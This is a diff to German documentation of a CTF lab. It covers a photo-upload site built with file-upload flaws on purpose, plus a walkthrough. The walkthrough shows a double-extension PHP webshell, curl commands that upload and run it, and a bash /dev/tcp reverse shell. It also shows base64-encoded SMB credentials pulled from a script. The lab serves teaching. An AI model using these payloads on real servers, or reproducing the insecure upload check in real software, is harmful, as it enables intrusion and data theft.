@@ -140,25 +140,129 @@ Die folgende Tabelle zeigt eine Übersicht aller im CTF implementierten Flags, i
 
 | Flag | Pfad | Hinweise |
 | --- | --- | --- |
-|  |  |  |
-| flag{operator_crypto_2025_7f4b9a} | /home/operator/operator.txt | /share/internalIT/DisasterRecovery.txt
-/share/internalIT/TODO.txt |
+| flag{initial_access_luzernermoments_83723} | /home/webflag/flag.txt | robots.txt, Upload-Formular, Fehlermeldungen |
+| flag{operator_crypto_2025_7f4b9a} | /home/operator/operator.txt | /share/internalIT/DisasterRecovery.txt, /share/internalIT/TODO.txt |
 |  |  |  |
 
 ## Flag 1:  Initial Access - Webseite
 
-Flurin
+Im folgenden Kapitel wird der Aufbau des ersten Flags beschrieben. Durch das Lösen dieses Flags erhält der Spieler:in Initial Access zum System über eine Remote Code Execution (RCE) Schwachstelle in der Webanwendung.
 
-Website mit Bilder hochladen mit RCE Schwachstelle (#LuzrernermomentsChallenge)
+### Einführung
 
-Initial Access
+Die Stadt Luzern hat kurzfristig eine Kampagne namens **#LuzernerMoments** gestartet, bei der Touristen und Einheimische ihre schönsten Fotos aus Luzern hochladen können. Aufgrund des Zeitdrucks wurde die Webanwendung schnell entwickelt, wobei Sicherheitsaspekte vernachlässigt wurden. Die Spieler:innen sollen die Schwachstellen in der Upload-Funktionalität identifizieren und ausnutzen, um Zugriff auf das System zu erlangen.
 
-- **Dateiendungs-Check statt Inhaltsprüfung**
-    - Die App prüft nur die Dateiendung und akzeptiert Uploads, wenn die Endung stimmt. Wenn die App Endung allein prüft, kann ein Angreifer eine Datei mit gefälschter Endung hochladen, deren Inhalt aber beispielsweise PHP-Code enthält.
-- **Falsche Content-Type / MIME-Type-Prüfung**
-    - Serverseitige Content-Type-Checks werden oft clientseitig umgangen. Die Applikation verlässt sich auf Angaben des Browsers statt auf die tatsächlichen Datei-Inhalte (z. B. Magic-Bytes).
-- **Uploads in öffentliches, ausführbares Web-Verzeichnis**
-    - Wird die Datei in ein Verzeichnis geschrieben, das vom Webserver interpretiert wird (z. B. `DocumentRoot/uploads/` und `.php` wird als PHP ausgeführt), kann die hochgeladene Datei als Code laufen
+### Installation der Webseite
+
+Die Webseite wird auf dem Ubuntu Server mit Apache2 und PHP 8.3 betrieben. Für die Installation wurde ein automatisiertes Bash-Skript (`install.sh`) erstellt, welches alle erforderlichen Komponenten installiert und konfiguriert.
+
+Das Installations-Script führt folgende Schritte aus:
+
+1. Aktualisierung der Paketlisten
+2. Installation von Git (falls nicht vorhanden)
+3. Klonen des Repositories von GitHub: https://github.com/Flurin17/cyberwars
+4. Installation von Apache2 und PHP
+5. Kopieren der Website-Dateien nach `/var/www/html`
+6. Erstellung der Verzeichnisstruktur (`uploads/`, `data/`)
+7. Setzen der korrekten Berechtigungen
+8. Erstellung des System-Users `webflag`
+9. Erstellung der Flag-Datei
+10. Aktivierung und Start von Apache
+
+```bash
+konfigurator@lutourismus:~$ sudo bash install.sh
+```
+
+### Komponenten der Webanwendung
+
+Die Webanwendung besteht aus folgenden Komponenten:
+
+| **Datei** | **Beschreibung** |
+| --- | --- |
+| `index.php` | Hauptseite mit Upload-Formular und Kampagneninformation |
+| `upload.php` | Upload-Handler mit Schwachstelle |
+| `gallery.php` | Galerie mit hochgeladenen Bildern |
+| `thanks.php` | Bestätigungsseite nach erfolgreichem Upload |
+| `config.php` | Konfigurationsdatei mit Pfaden und Einstellungen |
+| `functions.php` | Hilfsfunktionen für Submission-Verwaltung |
+| `assets/style.css` | Stylesheet für modernes Design |
+| `robots.txt` | Robots-Datei mit Hinweisen auf gesperrte Verzeichnisse |
+| `.htaccess` | Apache-Konfiguration |
+| `uploads/` | Verzeichnis für hochgeladene Dateien |
+| `data/submissions.jsonl` | JSONL-Datei mit Submission-Daten |
+
+### Implementierte Schwachstellen
+
+Die Upload-Funktionalität in `upload.php` enthält mehrere absichtliche Sicherheitslücken:
+
+#### 1. Dateiendungs-Check statt Inhaltsprüfung
+
+Die Applikation prüft **nur die Dateiendung** mit `pathinfo()` und akzeptiert Uploads, wenn die Endung zu den erlaubten Formaten gehört (`.jpg`, `.jpeg`, `.png`, `.gif`). Es erfolgt **keine Prüfung der tatsächlichen Dateiinhalte** (Magic Bytes) oder des MIME-Types.
+
+```php
+$fileExtension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
+
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
+if (!in_array($fileExtension, $allowedExtensions)) {
+    die('Ungültiges Dateiformat. Erlaubt sind: JPG, JPEG, PNG, GIF');
+}
+```
+
+Ein Angreifer kann eine Datei mit **Double-Extension** hochladen (z. B. `shell.php.jpg`). Die Applikation erkennt die Endung `.jpg` und akzeptiert den Upload, jedoch interpretiert Apache die Datei als PHP-Code, da `.php` in der Dateiendung enthalten ist.
+
+#### 2. Uploads in ausführbares Web-Verzeichnis
+
+Die hochgeladenen Dateien werden direkt in das Verzeichnis `uploads/` innerhalb des DocumentRoot gespeichert. Dieses Verzeichnis ist vom Webserver aus direkt erreichbar und **PHP-Code wird standardmässig ausgeführt**.
+
+In einer sicheren Konfiguration würde:
+- PHP-Ausführung im Upload-Verzeichnis deaktiviert sein
+- Uploads ausserhalb des DocumentRoot gespeichert werden
+- Eine strikte Content-Type-Prüfung erfolgen
+- Magic-Byte-Validierung implementiert sein
+
+#### 3. Fehlende .htaccess-Absicherung
+
+Die `.htaccess`-Datei enthält **keinen Schutz** gegen PHP-Ausführung im `uploads/`-Verzeichnis. In einer sicheren Konfiguration würde dort stehen:
+
+```apache
+<Directory "/var/www/html/uploads">
+    php_flag engine off
+</Directory>
+```
+
+Dies würde die Ausführung von PHP-Code im Upload-Verzeichnis verhindern.
+
+### Erstellung System-User und Flag
+
+Für das Flag wurde ein dedizierter System-User namens **`webflag`** erstellt, der keinen interaktiven Login besitzt:
+
+```bash
+konfigurator@lutourismus:~$ sudo useradd -r -m -s /usr/sbin/nologin webflag
+```
+
+Das Flag wurde in der Datei `/home/webflag/flag.txt` gespeichert und ist nur für den User `webflag` lesbar:
+
+```bash
+root@lutourismus:~# echo "flag{initial_access_luzernermoments_83723}" > /home/webflag/flag.txt
+root@lutourismus:~# chown webflag:webflag /home/webflag/flag.txt
+root@lutourismus:~# chmod 444 /home/webflag/flag.txt
+root@lutourismus:~# ls -l /home/webflag/
+total 4
+-r--r--r-- 1 webflag webflag 43 Oct 19 2025 flag.txt
+```
+
+- **Flag:** `flag{initial_access_luzernermoments_83723}`
+- **Pfad:** `/home/webflag/flag.txt`
+- **Berechtigungen:** `444` (alle können lesen, niemand kann schreiben)
+
+### Hinweise für Spieler:innen
+
+Um die Spieler:innen in die richtige Richtung zu lenken, wurden folgende Hinweise implementiert:
+
+1. **robots.txt**: Enthält Einträge für `/uploads/` und `/backup_smb.sh`, was auf interessante Verzeichnisse und Dateien hinweist
+2. **Upload-Formular**: Zeigt deutlich, welche Dateitypen akzeptiert werden
+3. **Fehlermeldungen**: Geben klare Hinweise auf die Validierungslogik
+4. **Galerie**: Zeigt hochgeladene Dateien und deren Speicherort
 
 ## Flag 2: Operator Access - Crypto Challenge
 
@@ -654,7 +758,284 @@ rm -f ~/.nano_history
 
 Dieser Abschnitt beschriebt den vollständigen Lösungs Walkthrough des CTF in chronologischer Reihenfolge. Es wird gezeigt, wie die einzelnen Flags gefunden und gelöst werden können. Zu jedem Flag werden die nötigen Schritte, die verwendeten Werkzeuge, die wichtigsten Befehle und die gefundenen Artefakte klar dokumentiert.
 
-Flag 1
+## Walkthrough Flag 1: Initial Access via RCE
+
+### Schritt 1: Web-Enumeration & Reconnaissance
+
+Als Erstes wird eine Web-Enumeration durchgeführt, um die Struktur der Webseite und mögliche interessante Pfade zu identifizieren. Hierfür können Tools wie **dirb**, **gobuster** oder **ffuf** verwendet werden.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ dirb http://10.0.2.10
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Oct 19 14:23:45 2025
+URL_BASE: http://10.0.2.10/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.0.2.10/ ----
++ http://10.0.2.10/.htaccess (CODE:403|SIZE:275)
+==> DIRECTORY: http://10.0.2.10/assets/
++ http://10.0.2.10/config.php (CODE:200|SIZE:0)
+==> DIRECTORY: http://10.0.2.10/data/
++ http://10.0.2.10/gallery.php (CODE:200|SIZE:1234)
++ http://10.0.2.10/index.php (CODE:200|SIZE:3456)
++ http://10.0.2.10/robots.txt (CODE:200|SIZE:345)
++ http://10.0.2.10/thanks.php (CODE:200|SIZE:2134)
++ http://10.0.2.10/upload.php (CODE:302|SIZE:0)
+==> DIRECTORY: http://10.0.2.10/uploads/
+
+-----------------
+END_TIME: Sat Oct 19 14:25:12 2025
+DOWNLOADED: 4612 - FOUND: 7
+```
+
+Die Enumeration zeigt interessante Dateien und Verzeichnisse:
+- `/robots.txt` - Könnte Hinweise enthalten
+- `/uploads/` - Verzeichnis für hochgeladene Dateien
+- `/upload.php` - Upload-Handler
+- `/gallery.php` - Galerie
+- `/data/` - Daten-Verzeichnis
+
+### Schritt 2: Analyse von robots.txt
+
+Die `robots.txt`-Datei wird untersucht, um zu sehen, welche Bereiche für Crawler gesperrt sind:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.0.2.10/robots.txt
+
+# Luzerner Tourismusbüro - robots.txt
+# #LuzernerMoments Kampagne
+
+User-agent: *
+Disallow: /uploads/
+Disallow: /data/
+Disallow: /backup_smb.sh
+Allow: /
+```
+
+**Erkenntnisse:**
+- `/uploads/` ist für Crawler gesperrt (interessant!)
+- `/backup_smb.sh` wird erwähnt (für Flag 2 relevant)
+- `/data/` enthält vermutlich sensible Informationen
+
+### Schritt 3: Analyse der Upload-Funktionalität
+
+Auf der Hauptseite (`index.php`) befindet sich ein Upload-Formular für die #LuzernerMoments Kampagne. Das Formular zeigt, dass folgende Dateitypen akzeptiert werden:
+- JPG, JPEG, PNG, GIF
+
+Zunächst wird ein normaler Upload mit einem echten Bild getestet:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.10/upload.php \
+  -F "name=Test User" \
+  -F "email=test@example.com" \
+  -F "description=Test Moment" \
+  -F "photo=@test_image.jpg"
+
+# Redirect zu: http://10.0.2.10/thanks.php?photo=photo_abc123def456.jpg
+```
+
+Der Upload funktioniert und die Datei wird mit einem zufälligen Namen im `/uploads/`-Verzeichnis gespeichert.
+
+### Schritt 4: Identifizierung der Schwachstelle
+
+Als Nächstes wird getestet, ob die Validierung umgangen werden kann. Es wird versucht, eine PHP-Datei mit **Double-Extension** hochzuladen:
+
+**Erstelle eine einfache PHP-Webshell:**
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat > shell.php.jpg << 'EOF'
+<?php
+system($_GET['cmd']);
+?>
+EOF
+```
+
+**Upload der Webshell:**
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.10/upload.php \
+  -F "name=Hacker" \
+  -F "email=hacker@evil.com" \
+  -F "description=Beautiful moment" \
+  -F "photo=@shell.php.jpg"
+
+# Redirect zu: http://10.0.2.10/thanks.php?photo=photo_1a2b3c4d5e6f7890.jpg
+```
+
+Der Upload wird akzeptiert! Die Applikation prüft nur die Endung `.jpg` und übersieht, dass `.php` in der Dateiendung enthalten ist.
+
+### Schritt 5: Remote Code Execution (RCE)
+
+Die hochgeladene Datei kann nun direkt aufgerufen werden. Da Apache die Datei als PHP interpretiert, wird der Code ausgeführt:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=id"
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+**Erfolg!** Remote Code Execution wurde erreicht. Der Code wird als User `www-data` ausgeführt.
+
+### Schritt 6: System-Enumeration
+
+Mit der RCE können nun verschiedene Befehle ausgeführt werden, um das System zu erkunden:
+
+```bash
+# Liste das aktuelle Verzeichnis
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/var/www/html"
+
+total 48
+drwxr-xr-x 5 www-data www-data 4096 Oct 19 14:00 .
+drwxr-xr-x 3 root     root     4096 Oct 19 12:00 ..
+-rw-r--r-- 1 www-data www-data  743 Oct 19 13:00 .htaccess
+drwxr-xr-x 2 www-data www-data 4096 Oct 19 13:00 assets
+-rw-r--r-- 1 www-data www-data  412 Oct 19 13:00 config.php
+drwxr-xr-x 2 www-data www-data 4096 Oct 19 14:15 data
+-rw-r--r-- 1 www-data www-data  987 Oct 19 13:00 functions.php
+-rw-r--r-- 1 www-data www-data 3542 Oct 19 13:00 gallery.php
+-rw-r--r-- 1 www-data www-data 4321 Oct 19 13:00 index.php
+-rw-r--r-- 1 www-data www-data  234 Oct 19 13:00 robots.txt
+-rw-r--r-- 1 www-data www-data 2567 Oct 19 13:00 thanks.php
+-rw-r--r-- 1 www-data www-data 1876 Oct 19 13:00 upload.php
+drwxr-xr-x 2 www-data www-data 4096 Oct 19 14:23 uploads
+
+# Prüfe /home Verzeichnis
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/home"
+
+total 16
+drwxr-xr-x  4 root    root    4096 Oct 19 12:30 .
+drwxr-xr-x 19 root    root    4096 Oct 19 12:00 ..
+drwxr-xr-x  2 operator internalIT 4096 Oct 16 14:36 operator
+drwxr-xr-x  2 webflag webflag 4096 Oct 19 13:15 webflag
+```
+
+Interessant! Es gibt zwei User-Verzeichnisse: `operator` und `webflag`.
+
+### Schritt 7: Flag finden
+
+```bash
+# Liste Inhalt von /home/webflag
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/home/webflag"
+
+total 12
+drwxr-xr-x 2 webflag webflag 4096 Oct 19 13:15 .
+drwxr-xr-x 4 root    root    4096 Oct 19 12:30 ..
+-r--r--r-- 1 webflag webflag   43 Oct 19 13:15 flag.txt
+
+# Lese die Flag
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=cat%20/home/webflag/flag.txt"
+
+flag{initial_access_luzernermoments_83723}
+```
+
+**Erfolg!** Die Flag ist für alle lesbar und kann mit `www-data` Rechten ausgelesen werden.
+
+### Schritt 8: Interaktive Reverse Shell
+
+Um komfortabler zu arbeiten, wird eine Reverse Shell eingerichtet:
+
+```bash
+# Auf dem Angreifer-System (Kali):
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+
+# Reverse Shell triggern:
+┌──(kali㉿kali)-[~]
+└─$ curl -G "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg" \
+  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'"
+```
+
+Nach erfolgreicher Verbindung:
+
+```bash
+www-data@lutourismus:/var/www/html/uploads$ whoami
+www-data
+
+www-data@lutourismus:/var/www/html/uploads$ cd /home/webflag
+www-data@lutourismus:/home/webflag$ ls -la
+total 12
+drwxr-xr-x 2 webflag webflag 4096 Oct 19 13:15 .
+drwxr-xr-x 4 root    root    4096 Oct 19 12:30 ..
+-r--r--r-- 1 webflag webflag   43 Oct 19 13:15 flag.txt
+```
+
+### Schritt 9: Flag extrahieren
+
+Die Flag-Datei ist für alle lesbar, somit kann sie direkt mit `www-data` Rechten gelesen werden:
+
+```bash
+www-data@lutourismus:/home/webflag$ cat flag.txt
+flag{initial_access_luzernermoments_83723}
+```
+
+**Flag 1 gefunden:** `flag{initial_access_luzernermoments_83723}`
+
+### Schritt 10: Übergang zu Flag 2
+
+Mit dem Initial Access können nun weitere interessante Dateien untersucht werden:
+
+```bash
+www-data@lutourismus:/$ ls -la /usr/local/sbin/
+total 16
+drwxr-xr-x 2 root root 4096 Oct 11 13:46 .
+drwxr-xr-x 10 root root 4096 Oct 11 10:00 ..
+-rwxr--r-- 1 root root 2012 Oct 11 13:46 backup_smb.sh
+
+www-data@lutourismus:/$ cat /usr/local/sbin/backup_smb.sh
+#!/bin/bash
+...
+U=$(echo YmFja3Vwc21i | base64 -d)
+P=$(echo eU1UclRiQWM1NlUyTzgwd1RsbFk4VGcxbUpKWU93 | base64 -d)
+...
+```
+
+Das Skript `backup_smb.sh` (aus `robots.txt`) enthält Base64-kodierte Zugangsdaten für SMB. Dies führt direkt zu **Flag 2**.
+
+### Zusammenfassung Flag 1
+
+**Schwachstelle:** Unsichere Datei-Upload-Funktionalität mit:
+- Nur Dateiendungs-Check (keine Magic-Byte-Prüfung)
+- Keine MIME-Type-Validierung
+- Uploads in ausführbares Web-Verzeichnis
+- PHP-Execution im Upload-Verzeichnis nicht deaktiviert
+
+**Exploitation:**
+1. Erstelle PHP-Webshell mit Double-Extension (`.php.jpg`)
+2. Upload über das Formular
+3. Direkter Aufruf der hochgeladenen Datei führt zu RCE
+4. System-Enumeration und Flag-Extraktion
+
+**Tools:**
+- dirb/gobuster (Web-Enumeration)
+- curl (HTTP-Requests)
+- netcat (Reverse Shell)
+- Standard Linux-Tools (ls, cat, find)
+
+**Gelernte Konzepte:**
+- Web-Reconnaissance
+- Datei-Upload-Schwachstellen
+- Double-Extension-Bypass
+- Remote Code Execution
+- Initial Access Techniken
 
 Flag 2
 
